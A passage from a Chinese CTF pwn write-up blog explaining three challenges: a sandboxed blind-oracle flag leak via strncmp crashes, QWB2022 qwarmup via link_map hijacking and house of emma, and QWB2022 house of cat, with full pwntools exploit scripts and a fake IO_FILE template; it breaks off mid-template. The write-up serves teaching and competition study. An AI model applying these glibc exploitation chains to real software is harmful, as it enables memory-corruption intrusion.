class="line">&#125;</span><br></pre></td></tr></table></figure><p>开了沙箱，不能getshell，有一个很大的溢出，没有任何输出函数</p><p>让人受益良多的一道题，pwn题的盲注。</p><p>首先，64位栈题下，永远不要忘了ret2csu(即万能gadget)，这题的各种函数调用大都是通过ret2csu构造出来的。其次，__libc_start_main会在函数栈中写入initial和exit_funcs_lock的地址，如下图</p><p><a href="https://imgtu.com/i/vPGwdS"><img src="https://s1.ax1x.com/2022/07/29/vPGwdS.png" alt="vPGwdS.png"></a></p><p>第三，利用一些magic_gadget，可以达成任意地址构造出任意值，这道题的magic_gadget如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x4005e8 &lt;__do_global_dtors_aux+24&gt;:add    DWORD PTR [rbp-0x3d],ebx</span><br><span class="line">0x4005eb &lt;__do_global_dtors_aux+27&gt;:nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">0x4005f0 &lt;__do_global_dtors_aux+32&gt;:repz ret</span><br></pre></td></tr></table></figure><p>构造好rbp和rbp的值就能构造出任意值。</p><p>第四，如何得到flag。作为一个orw题目肯定需要open的，但此题不能泄露libc地址，该如何open？libc_start_main已经在栈上遗留下了libc地址，我们可以计算出syscall_ret的地址和其中一个libc地址的偏移量，再利用magic_gadget将这个偏移量加上去，那么栈中就有了syscall_ret的地址，我们直接系统调用open来打开flag，rax的构造就使用read函数，read的返回值就是存在rax中的，读入多少字符rax就为多少。open和read都有了，w是无论如何都出不来的，因为在沙箱里面只允许open和write系统调用。</p><p>怎么替代w，这里就可以像sql注入里的盲注一样，用strncmp来逐字节比较真实的flag和我们猜测的flag。实际上，strncmp调用的是<code>__strncmp_sse42</code>函数，我们需要构造出这个函数的地址，构造方法还是和构造syscall的方法一样。</p><p>有了比较函数，接下来还有一个问题，该如何得到比较结果？strncmp比较前n个字符是否一致，实际上也是从第一个字节开始逐字节比较</p><p><a href="https://imgtu.com/i/vP08JK"><img src="https://s1.ax1x.com/2022/07/29/vP08JK.png" alt="vP08JK.png"></a></p><p>在本题中，bss段到0x602000就结束了，从0x602000开始往后就是未映射内存，无法访问，访问就会报错。基于这个前提，我们可以把需要比较的字符放在0x601fff处，然后用<code>__strncmp_sse42</code>一次比较两个字符，如果0x601fff处的字符和flag相同的话，就会继续比较0x602000处的字符和flag的下一个字符是否相同，但0x602000是无法访问的，此时程序就直接报错了，因此，可以从程序是否报错了来判断字符是否和flag相同。</p><p>整体思路为：栈迁移到bss段，在bss段中重启libc_start_main，在栈上得到libc地址，运用magic_gadget得到syscall和__strncmp_sse42的地址，再用open将rax设置为2，ret2csu系统调用open，随后将flag读取到bss段的某个位置，最后调用strncmp进行比较。</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./no_write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">csu_pop=<span class="number">0x40076a</span></span><br><span class="line">leave_ret=<span class="number">0x000000000040067c</span></span><br><span class="line">call_libc_start_main=<span class="number">0x0000000000400544</span></span><br><span class="line">pop_rdi=<span class="number">0x0000000000400773</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000400771</span></span><br><span class="line">read_n=elf.symbols[<span class="string">&#x27;read_n&#x27;</span>]</span><br><span class="line">magic_gadget=<span class="number">0x4005e8</span></span><br><span class="line">offset_init2strncmp=<span class="number">0x267600</span></span><br><span class="line">offset_exit_funcs_lock2syscall=<span class="number">0x31dc53</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret_csu</span>(<span class="params">func,arg1,arg2,arg3</span>):</span><br><span class="line">    payload=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(func)</span><br><span class="line">    payload+=p64(arg1)+p64(arg2)+p64(arg3)</span><br><span class="line">    payload+=p64(<span class="number">0x400750</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x30</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;&#125;&#123;_&#x27;</span>+string.digits+string.ascii_letters:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                io=process(<span class="string">&#x27;./no_write&#x27;</span>)</span><br><span class="line">                payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(csu_pop)+ret_csu(elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,<span class="number">0x601350</span>,<span class="number">0x400</span>)</span><br><span class="line">                payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x6013f8</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(leave_ret)</span><br><span class="line">                payload=payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">                <span class="comment"># gdb.attach(io)</span></span><br><span class="line">                <span class="comment"># pause()</span></span><br><span class="line">                io.send(payload)</span><br><span class="line">                payload=<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x100</span>-<span class="number">0x50</span>)</span><br><span class="line">                payload+=p64(pop_rdi)+p64(read_n)+p64(call_libc_start_main)</span><br><span class="line">                payload=payload.ljust(<span class="number">0x400</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">                sleep(<span class="number">0.1</span>)</span><br><span class="line">                io.send(payload)</span><br><span class="line">                payload=p64(csu_pop)+p64(<span class="number">0x100000000</span>-offset_init2strncmp)+p64(<span class="number">0x601318</span>+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(magic_gadget)</span><br><span class="line">                payload+=p64(csu_pop)+p64(<span class="number">0x100000000</span>-offset_exit_funcs_lock2syscall)+p64(<span class="number">0x601310</span>+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(magic_gadget)</span><br><span class="line">                payload+=p64(csu_pop)+ret_csu(elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,<span class="number">0x601800</span>,<span class="number">2</span>)+p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">                payload+=p64(csu_pop)+ret_csu(<span class="number">0x601310</span>,<span class="number">0x601350</span>+<span class="number">0x3f8</span>,<span class="number">0</span>,<span class="number">0</span>)+p64(<span class="number">0</span>)*<span class="number">6</span> <span class="comment">#open</span></span><br><span class="line">                payload+=p64(csu_pop)+ret_csu(elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">3</span>,<span class="number">0x601800</span>,<span class="number">0x30</span>)+p64(<span class="number">0</span>)*<span class="number">6</span> <span class="comment">#read</span></span><br><span class="line">                payload+=p64(csu_pop)+ret_csu(elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,<span class="number">0x601ff8</span>,<span class="number">8</span>)+p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">                payload+=p64(csu_pop)+ret_csu(<span class="number">0x601318</span>,<span class="number">0x601800</span>+i,<span class="number">0x601fff</span>,<span class="number">2</span>)+p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">                payload+=p64(pop_rdi)+p64(<span class="number">0x601700</span>)+p64(pop_rsi_r15)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(read_n)</span><br><span class="line">                payload=payload.ljust(<span class="number">0x3f8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">                payload+=<span class="string">&#x27;flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">                sleep(<span class="number">0.1</span>)</span><br><span class="line">                io.send(payload)</span><br><span class="line">                sleep(<span class="number">0.1</span>)</span><br><span class="line">                io.send(<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line">                sleep(<span class="number">0.1</span>)</span><br><span class="line">                io.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">7</span>+j)</span><br><span class="line">                sleep(<span class="number">0.1</span>)</span><br><span class="line">                io.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line">                io.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">                io.close()</span><br><span class="line">            <span class="keyword">except</span> EOFError:</span><br><span class="line">                flag+=j</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">if</span> j==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                    exit()</span><br><span class="line">                io.close()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0xD-QWB2022-qwarmup【任意地址写，修改link-map结构体劫持延迟绑定实现任意函数调用，house-of-emma】"><a href="#0xD-QWB2022-qwarmup【任意地址写，修改link-map结构体劫持延迟绑定实现任意函数调用，house-of-emma】" class="headerlink" title="0xD.QWB2022 qwarmup【任意地址写，修改link_map结构体劫持延迟绑定实现任意函数调用，house of emma】"></a>0xD.QWB2022 qwarmup【任意地址写，修改link_map结构体劫持延迟绑定实现任意函数调用，house of emma】</h2><p>好题，就是比赛的时候做不出来,看了大佬的wp复现一下</p><p><a href="https://imgtu.com/i/vMvpSP"><img src="https://s1.ax1x.com/2022/08/08/vMvpSP.png" alt="vMvpSP.png"></a></p><p>首先能申请一个任意大小的chunk，然后输入一个偏移offset，输入一个字节value，使chunk[offset]&#x3D;value，即任意地址写。</p><p>一次写之后，会将size的低两字节赋值为0，再检查size是否为0，是的话就可以继续任意地址写，否则退出程序。</p><p>如果我们输入的size小于两字节的话，那么就可以无限任意地址写，但这样子申请到的chunk距离libc就很远，没办法往libc地址上写；而如果我们申请一个很大的chunk，比如0x30000，就可以在libc附近得到一块内存，然而这样就只能任意地址写一次。</p><p><a href="https://imgtu.com/i/vQzn0O"><img src="https://s1.ax1x.com/2022/08/08/vQzn0O.png" alt="vQzn0O.png"></a></p><p>程序剩下一个RELRO没有完全开启，这样一来got表就是可写的，函数需要经过延迟绑定才能够确定真实地址。</p><p>在dl_resolve中，主要涉及到的是link_map结构体，ret2dl的具体细节我忘记了，这里就记录一下从题目中了解到的一些信息</p><p>如何定位link_map结构体？</p><p><a href="https://imgtu.com/i/vQzD9s"><img src="https://s1.ax1x.com/2022/08/08/vQzD9s.png" alt="vQzD9s.png"></a></p><p>在rtld_global结构体中，ns_loaded就是link_map结构体指针</p><p><a href="https://imgtu.com/i/vQzr3n"><img src="https://s1.ax1x.com/2022/08/08/vQzr3n.png" alt="vQzr3n.png"></a></p><p>l_next指向的就是下一个link_map结构体。经过调试，<code>0x7f85836982e0</code>就是write函数的link_map结构体。</p><p>l_addr实际上是pie的基地址</p><p><a href="https://imgtu.com/i/vlSkVS"><img src="https://s1.ax1x.com/2022/08/08/vlSkVS.png" alt="vlSkVS.png"></a></p><p>dl_resolve解析完成之后，会将函数的真实地址写入<code>l_addr+sym.got</code>位置处，也就是对应函数的got表中。如果我们将l_addr改大，那么函数的真实地址也会写入往后偏移的地址。</p><p>因此我们可以利用这一机制，修改l_addr的末尾一字节，使得dl_resolve将write函数的真实地址的高4字节写入到size中，这样就会覆盖掉原有的size，如下图所示</p><p><a href="https://imgtu.com/i/vlSLMq"><img src="https://s1.ax1x.com/2022/08/08/vlSLMq.png" alt="vlSLMq.png"></a></p><p>如此一来，我们就有了无限任意地址写的机会。</p><p>然后由于write的真实地址没有写到write的got表中，所以write会一直进行dl_resolve来解析地址。</p><p>dl_resolve会调用dl_fixup函数，dl_fixup函数又会调用<code>_dl_lookup_symbol_x</code>函数</p><p><a href="https://imgtu.com/i/vlpGef"><img src="https://s1.ax1x.com/2022/08/08/vlpGef.png" alt="vlpGef.png"></a></p><p>这个函数的第一个参数就是要解析的函数名</p><p><a href="https://imgtu.com/i/vlpYTS"><img src="https://s1.ax1x.com/2022/08/08/vlpYTS.png" alt="vlpYTS.png"></a></p><p>sym-&gt;st_name对同一个函数而言是固定值，比如解析write函数，sym-&gt;st_name就是0x22，<code>strtab</code>定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span></span></span><br><span class="line"><span class="class"><span class="title">const</span> <span class="title">char</span> *<span class="title">strtab</span> =</span> (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRTAB5<span class="comment">/* Address of string table */</span></span></span><br></pre></td></tr></table></figure><p>这个strtab实际上就是指向link_map结构体中的l_info数组中的下标为5的值，如下</p><p><a href="https://imgtu.com/i/vl13Cj"><img src="https://s1.ax1x.com/2022/08/09/vl13Cj.png" alt="vl13Cj.png"></a></p><p><a href="https://imgtu.com/i/vl1NrV"><img src="https://s1.ax1x.com/2022/08/09/vl1NrV.png" alt="vl1NrV.png"></a></p><p>前八字节为函数名的长度，后八字节加上sym-&gt;st_name就能找到对应的函数名。</p><p>dl_resolve是根据函数符号来确定要调用的函数的，如果我们能伪造函数名，就能够实现任意函数调用。</p><p>首先要泄露libc地址，由于程序使用的是write，write不会涉及到FILE结构体，如果我们只将IO_2_1_stdout结构体修改，并不能够泄露出libc地址。如何解决？</p><p>首先还是对IO_2_1_stdout进行修改，然后使用任意函数调用，调用IO_flush_all这个函数，随后就能够输出libc地址。</p><p>现在有了libc地址，任意地址写，任意函数调用，如何打？</p><p>采用的是house of emma，打io_cookie_write函数。如何触发？还是调用IO_flush_all，这个函数最终会调用IO_str_overflow，构造好vtable的偏移，使得调用IO_str_overflow时调用io_cookie_write，然后执行srop，exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./qwarmup&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">offset,content</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        io.send(p64(offset+i))</span><br><span class="line">        <span class="comment">#gdb.attach(io)</span></span><br><span class="line">        io.send(content[i])</span><br><span class="line">        io.recvuntil(<span class="string">&#x27;Success!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.send(p32(<span class="number">0xf0000</span>))</span><br><span class="line">write(<span class="number">0x36a2d0</span>,<span class="string">&#x27;\x70&#x27;</span>)</span><br><span class="line">write(<span class="number">0x30e770</span>,p32(<span class="number">0xfbad1800</span>))</span><br><span class="line">write(<span class="number">0x30e770</span>+<span class="number">0x20</span>+<span class="number">0x8</span>,p8(<span class="number">0xff</span>))</span><br><span class="line"></span><br><span class="line">write(<span class="number">0x36a108</span>+<span class="number">0x22</span>,<span class="string">&quot;_IO_flush_all&quot;</span>)</span><br><span class="line">io.send(p64(<span class="number">0x36a338</span>))</span><br><span class="line">io.send(p8(<span class="number">0xb8</span>))</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x21ba70</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">setcontext_addr=libc_base+libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">pop_rdi=libc_base+<span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_r12=libc_base+<span class="number">0x000000000011f497</span></span><br><span class="line">pop_rax_ret=libc_base+<span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall_ret=libc_base+<span class="number">0x0000000000091396</span></span><br><span class="line">pcop_addr=libc_base+<span class="number">0x00000000001675b0</span></span><br><span class="line">ret=libc_base+<span class="number">0x00000000000f8b56</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdx, qword ptr [rdi + 8]; </span></span><br><span class="line"><span class="string">mov qword ptr [rsp], rax; </span></span><br><span class="line"><span class="string">call qword ptr [rdx + 0x20];</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">io_cookie_jumps=libc_base+<span class="number">0x215b80</span></span><br><span class="line">pointer_gaurd_addr_offset=<span class="number">0xf1760</span></span><br><span class="line">io_2_1_stderr_offset=<span class="number">0x30e690</span></span><br><span class="line">srop_addr=libc_base-<span class="number">0xf3ff0</span></span><br><span class="line"></span><br><span class="line">write(<span class="number">0x36a338</span>,p8(<span class="number">0x78</span>))</span><br><span class="line">write(pointer_gaurd_addr_offset,p64(<span class="number">0</span>))</span><br><span class="line">write(io_2_1_stderr_offset+<span class="number">0x28</span>,p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line">write(io_2_1_stderr_offset+<span class="number">0xd8</span>,p64(io_cookie_jumps+<span class="number">0x60</span>))</span><br><span class="line">enc=((pcop_addr^<span class="number">0</span>)&gt;&gt;(<span class="number">64</span>-<span class="number">0x11</span>))|((pcop_addr^<span class="number">0</span>)&lt;&lt;<span class="number">0x11</span>)</span><br><span class="line">write(io_2_1_stderr_offset+<span class="number">0xe0</span>,p64(srop_addr))</span><br><span class="line">write(io_2_1_stderr_offset+<span class="number">0xf0</span>,p64(enc))</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(srop_addr+<span class="number">0x10</span>-<span class="number">0x20</span>)</span><br><span class="line">payload+=p64(setcontext_addr+<span class="number">61</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xa0</span>-<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(srop_addr+<span class="number">0xa0</span>)+p64(ret)</span><br><span class="line">payload+=p64(pop_rdi)+p64(srop_addr+<span class="number">0x200</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rax_ret)+p64(<span class="number">2</span>)+p64(syscall_ret)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(srop_addr+<span class="number">0x1000</span>)+p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)+p64(<span class="number">0</span>)+p64(libc_base+libc.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(srop_addr+<span class="number">0x1000</span>)+p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)+p64(<span class="number">0</span>)+p64(libc_base+libc.symbols[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload=payload.ljust(<span class="number">0x200</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=<span class="string">&#x27;./flag&#x27;</span>.ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">write(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.send(p64(<span class="number">0x36a338</span>))</span><br><span class="line">io.send(p8(<span class="number">0xb8</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0xE-QWB2022-house-of-cat"><a href="#0xE-QWB2022-house-of-cat" class="headerlink" title="0xE.QWB2022 house of cat"></a>0xE.QWB2022 house of cat</h2><p>这道题在比赛的时候我用的是house of emma做出来的。预期解是一种新的攻击手法，命名为<code>house of cat</code></p><p>house of cat只需要一次任意地址写，覆盖io_list_all或者stderr为一个堆地址即可，无需覆盖pointer_guard。</p><p>这个攻击手法利用的是<code>_IO_wfile_jumps</code>虚表中的<code>_IO_wfile_seekoff</code>函数</p><p><a href="https://imgtu.com/i/v1k5rj"><img src="https://s1.ax1x.com/2022/08/09/v1k5rj.png" alt="v1k5rj.png"></a></p><p><code>_IO_wfile_seekoff</code>源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span> _IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Short-circuit into a separate function.  We don&#x27;t want to mix any</span></span><br><span class="line"><span class="comment">     functionality and we don&#x27;t want to touch anything inside the FILE</span></span><br><span class="line"><span class="comment">     object. */</span></span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* POSIX.1 8.2.3.7 says that after a call the fflush() the file</span></span><br><span class="line"><span class="comment">     offset of the underlying file must be exact.  */</span></span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">== fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">       &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">   == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">      || _IO_in_put_mode (fp));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flush unwritten characters.</span></span><br><span class="line"><span class="comment">     (This may do an unneeded write if we seek within the buffer.</span></span><br><span class="line"><span class="comment">     But to be able to switch to reading, we would need to set</span></span><br><span class="line"><span class="comment">     egptr to pptr.  That can&#x27;t be done in the current design,</span></span><br><span class="line"><span class="comment">     which assumes file_ptr() is eGptr.  Anyway, since we probably</span></span><br><span class="line"><span class="comment">     end up flushing when we close(), it doesn&#x27;t make much difference.)</span></span><br><span class="line"><span class="comment">     <span class="doctag">FIXME:</span> simulate mem-mapped files. */</span></span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果<code>mode!=0</code>且<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>会调用<code>_IO_switch_to_wget_mode</code></p><p><code>_wide_data</code>是一个<code>_IO_wide_data</code>类型的结构体指针</p><p><a href="https://imgtu.com/i/v1EepT"><img src="https://s1.ax1x.com/2022/08/09/v1EepT.png" alt="v1EepT.png"></a></p><p>再看到<code>_IO_switch_to_wget_mode</code>的汇编</p><p><a href="https://imgtu.com/i/v1EdnH"><img src="https://s1.ax1x.com/2022/08/09/v1EdnH.png" alt="v1EdnH.png"></a></p><p>rdi是fake_IO_FILE的地址，也就是通过largebin attack写入到io_list_all或者stderr中的堆地址，我们可以控制rax，rdx，构造好堆布局，在最后call的时候调用setcontext即可，然后跳转到rsp执行orw即可。</p><p>从作者那弄来的构造模板如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr=heapbase+<span class="number">0xb00</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">0</span>)<span class="comment">#</span></span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0xb0</span>)<span class="comment">#_IO_backup_base=setcontext_rdx</span></span><br><span class="line">fake_IO_FILE +=p64(setcontext+<span class="number">61</span>)<span class="comment">#_IO_save_end=call addr(call setcontext)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)<span 